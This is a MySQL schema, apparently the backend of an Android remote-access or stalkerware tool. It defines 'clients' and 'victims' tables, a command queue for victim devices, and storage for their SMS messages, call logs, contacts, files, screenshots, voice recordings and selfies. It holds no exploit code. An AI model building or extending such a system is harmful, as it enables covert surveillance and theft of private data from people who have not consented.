DROP DATABASE IF EXISTS `xrob`;
CREATE DATABASE IF NOT EXISTS `xrob` /*!40100 DEFAULT CHARACTER SET latin1 */;
USE `xrob`;

DROP TABLE IF EXISTS `clients`;
CREATE TABLE IF NOT EXISTS `clients` (
  `id`                INT(11)      NOT NULL AUTO_INCREMENT,
  `username`          VARCHAR(20)  NOT NULL,
  `pass_hash`         TEXT         NOT NULL,
  `api_key`           VARCHAR(10)  NOT NULL,
  `email`             VARCHAR(100) NOT NULL,
  `is_verified_email` TINYINT(4)   NOT NULL DEFAULT 0,
  `is_premium_client` TINYINT(4)   NOT NULL DEFAULT 0,
  `is_active`         TINYINT(4)   NOT NULL DEFAULT 1,
  `client_code`       VARCHAR(10)  NOT NULL,
  `created_at`        TIMESTAMP    NOT NULL DEFAULT CURRENT_TIMESTAMP,
  PRIMARY KEY (id),
  UNIQUE KEY (username),
  UNIQUE KEY (email),
  UNIQUE KEY (api_key),
  UNIQUE KEY (client_code)
);

DROP TABLE IF EXISTS `victims`;
CREATE TABLE IF NOT EXISTS `victims` (
  `id`                INT(11)     NOT NULL AUTO_INCREMENT,
  `victim_code`       VARCHAR(10) NOT NULL,
  `name`              VARCHAR(100),
  `email`             VARCHAR(150),
  `phone`             VARCHAR(20),
  `fcm_id`            TEXT,
  `fcm_updated_at`    TIMESTAMP   NULL,
  `api_key`           VARCHAR(10) NOT NULL,
  `imei`              VARCHAR(16) NOT NULL,
  `device_name`       VARCHAR(50) NOT NULL,
  `device_hash`       TEXT        NOT NULL,
  `other_device_info` TEXT        NOT NULL,
  `actions`           VARCHAR(100)         DEFAULT NULL,
  `is_active`         TINYINT(4)  NOT NULL DEFAULT 1,
  `created_at`        TIMESTAMP   NOT NULL DEFAULT CURRENT_TIMESTAMP,
  PRIMARY KEY (`id`),
  UNIQUE KEY `imei` (`imei`),
  UNIQUE KEY `api_key` (`api_key`)
);

DROP TABLE IF EXISTS `client_victim_relations`;
CREATE TABLE IF NOT EXISTS `client_victim_relations` (
  `id`         INT(11)   NOT NULL AUTO_INCREMENT,
  `client_id`  INT       NOT NULL,
  `victim_id`  INT       NOT NULL,
  `created_at` TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP,
  PRIMARY KEY (id),
  FOREIGN KEY (client_id) REFERENCES clients (id)
    ON UPDATE CASCADE
    ON DELETE CASCADE,
  FOREIGN KEY (victim_id) REFERENCES victims (id)
    ON UPDATE CASCADE
    ON DELETE CASCADE
);


DROP TABLE IF EXISTS `deliveries`;
CREATE TABLE IF NOT EXISTS `deliveries` (
  `id`                   INT(11) NOT NULL    AUTO_INCREMENT,
  `victim_id`            INT(11) NOT NULL,
  `data_type`            ENUM(''messages'', ''call_logs'', ''contacts'', ''file_logs'', ''media_screen_shot'', ''media_voice'', ''media_selfie'', ''JOIN'', ''re_join'', ''other'') NOT NULL,
  `error`                TINYINT(4) NOT NULL,
  `message`              TEXT NOT NULL,
  `server_error`         TINYINT(4) NOT NULL DEFAULT 0,
  `server_error_message` TEXT                DEFAULT NULL,
  `created_at`           TIMESTAMP NOT NULL  DEFAULT CURRENT_TIMESTAMP,
  PRIMARY KEY (`id`),
  KEY `victim_id` (`victim_id`),
  FOREIGN KEY (`victim_id`) REFERENCES `victims` (`id`)
    ON DELETE CASCADE
    ON UPDATE CASCADE
);


DROP TABLE IF EXISTS `contacts`;
CREATE TABLE IF NOT EXISTS `contacts` (
  `id`                 INT(11)    NOT NULL AUTO_INCREMENT,
  `victim_id`          INT(11)    NOT NULL,
  `android_contact_id` INTEGER    NOT NULL,
  `name`               VARCHAR(100)        DEFAULT NULL,
  `is_active`          TINYINT(4) NOT NULL DEFAULT 1,
  `created_at`         TIMESTAMP  NOT NULL DEFAULT CURRENT_TIMESTAMP,
  PRIMARY KEY (`id`),
  KEY `victim_id` (`victim_id`),
  FOREIGN KEY (`victim_id`) REFERENCES `victims` (`id`)
    ON DELETE CASCADE
    ON UPDATE CASCADE
);

DROP TABLE IF EXISTS `contact_names_audit`;
CREATE TABLE IF NOT EXISTS `contact_names_audit` (
  `id`         INT(11)      NOT NULL AUTO_INCREMENT,
  `contact_id` INT(11)      NOT NULL,
  `name`       VARCHAR(100) NOT NULL,
  `created_at` TIMESTAMP    NOT NULL DEFAULT CURRENT_TIMESTAMP,
  PRIMARY KEY (id),
  FOREIGN KEY (contact_id) REFERENCES contacts (id)
    ON DELETE CASCADE
    ON UPDATE CASCADE
);


DROP TABLE IF EXISTS `phone_numbers`;
CREATE TABLE IF NOT EXISTS `phone_numbers` (
  `id`         INT(11)     NOT NULL AUTO_INCREMENT,
  `contact_id` INT         NOT NULL,
  `phone`      VARCHAR(20) NOT NULL,
  `phone_type` VARCHAR(20) NOT NULL,
  `created_at` TIMESTAMP   NOT NULL DEFAULT CURRENT_TIMESTAMP,
  PRIMARY KEY (id),
  FOREIGN KEY (contact_id) REFERENCES contacts (id)
    ON DELETE CASCADE
    ON UPDATE CASCADE
);


DROP TABLE IF EXISTS `commands`;
CREATE TABLE IF NOT EXISTS `commands` (
  `id`         INT(11)   NOT NULL AUTO_INCREMENT,
  `victim_id`  INT       NOT NULL,
  `client_id`  INT       NOT NULL,
  `command`    TEXT,
  `created_at` TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP,
  PRIMARY KEY (`id`),
  FOREIGN KEY (client_id) REFERENCES clients (id)
    ON UPDATE CASCADE
    ON DELETE CASCADE,
  FOREIGN KEY (victim_id) REFERENCES victims (id)
    ON UPDATE CASCADE
    ON DELETE CASCADE
);

DROP TABLE IF EXISTS `command_statuses`;
CREATE TABLE IF NOT EXISTS `command_statuses` (
  `id`                   INT(11)                                                  NOT NULL AUTO_INCREMENT,
  `command_id`           INT                                                      NOT NULL,
  `status`               ENUM (''SENT'', ''DELIVERED'', ''FINISHED'', ''FAILED'') NOT NULL DEFAULT ''SENT'',
  `status_message`       TEXT                                                     NOT NULL,
  `status_unx_timestamp` VARCHAR(20)                                              NOT NULL,
  `created_at`           TIMESTAMP                                                NOT NULL DEFAULT CURRENT_TIMESTAMP,
  PRIMARY KEY (`id`),
  FOREIGN KEY (command_id) REFERENCES commands (id)
    ON UPDATE CASCADE
    ON DELETE CASCADE
);


DROP TABLE IF EXISTS `files`;
CREATE TABLE IF NOT EXISTS `files` (
  `id`              INT(11)    NOT NULL AUTO_INCREMENT,
  `victim_id`       INT(11)    NOT NULL,
  `file_name`       TEXT       NOT NULL,
  `parent_id`       INT        NOT NULL DEFAULT 0,
  `is_directory`    TINYINT(4) NOT NULL,
  `file_size_in_kb` INT(11)    NOT NULL,
  `is_active`       TINYINT(4) NOT NULL DEFAULT 1,
  `created_at`      TIMESTAMP  NOT NULL DEFAULT CURRENT_TIMESTAMP,
  PRIMARY KEY (`id`),
  KEY `victim_id` (`victim_id`),
  FOREIGN KEY (`victim_id`) REFERENCES `victims` (`id`)
    ON DELETE CASCADE
    ON UPDATE CASCADE
);


DROP TABLE IF EXISTS `calls`;
CREATE TABLE IF NOT EXISTS `calls` (
  `id`         INT(11)                             NOT NULL AUTO_INCREMENT,
  `victim_id`  INT(11)                             NOT NULL,
  `name`       VARCHAR(100)                                 DEFAULT NULL,
  `phone`      VARCHAR(20)                         NOT NULL,
  `call_type`  ENUM('' IN '', ''OUT'', ''MISSED'') NOT NULL,
  `called_at`  TIMESTAMP                           NULL,
  `is_active`  TINYINT(4)                          NOT NULL DEFAULT 1,
  `created_at` TIMESTAMP                           NOT NULL DEFAULT CURRENT_TIMESTAMP,
  PRIMARY KEY (`id`),
  KEY `victim_id` (`victim_id`),
  FOREIGN KEY (`victim_id`) REFERENCES `victims` (`id`)
    ON DELETE CASCADE
    ON UPDATE CASCADE
);


DROP TABLE IF EXISTS `media`;
CREATE TABLE IF NOT EXISTS `media` (
  `id`          INT(11)                                     NOT NULL AUTO_INCREMENT,
  `victim_id`   INT(11)                                     NOT NULL,
  `name`        VARCHAR(100)                                NOT NULL,
  `_type`       ENUM(''SCREENSHOT'', ''VOICE'', ''SELFIE'') NOT NULL,
  `captured_at` TIMESTAMP                                   NULL,
  `is_active`   TINYINT(4)                                  NOT NULL DEFAULT 1,
  `created_at`  TIMESTAMP                                   NOT NULL DEFAULT CURRENT_TIMESTAMP,
  PRIMARY KEY (`id`),
  KEY `victim_id` (`victim_id`),
  FOREIGN KEY (`victim_id`) REFERENCES `victims` (`id`)
    ON DELETE CASCADE
    ON UPDATE CASCADE
);

DROP TABLE IF EXISTS `messages`;
CREATE TABLE IF NOT EXISTS `messages` (
  `id`           INT(11)                      NOT NULL AUTO_INCREMENT,
  `victim_id`    INT(11)                      NOT NULL,
  `phone`        VARCHAR(20)                  NOT NULL,
  `content`      TEXT                         NOT NULL,
  `_type`        ENUM (''inbox'', ''outbox'') NOT NULL,
  `delivered_at` BIGINT                       NOT NULL,
  `created_at`   TIMESTAMP                    NOT NULL DEFAULT CURRENT_TIMESTAMP,
  PRIMARY KEY (`id`),
  KEY `victim_id` (`victim_id`),
  FOREIGN KEY (`victim_id`) REFERENCES `victims` (`id`)
    ON DELETE CASCADE
    ON UPDATE CASCADE
);


/* Change the delimiter so we can use ";" within the CREATE TRIGGER */
DELIMITER $$

CREATE TRIGGER after_contacts_update
AFTER UPDATE ON contacts
FOR EACH ROW BEGIN
  IF OLD.name <> NEW.name
  THEN
    INSERT INTO contact_names_audit
    SET contact_id = OLD.id,
      name         = OLD.name;
  END IF;
END$$

DELIMITER ;

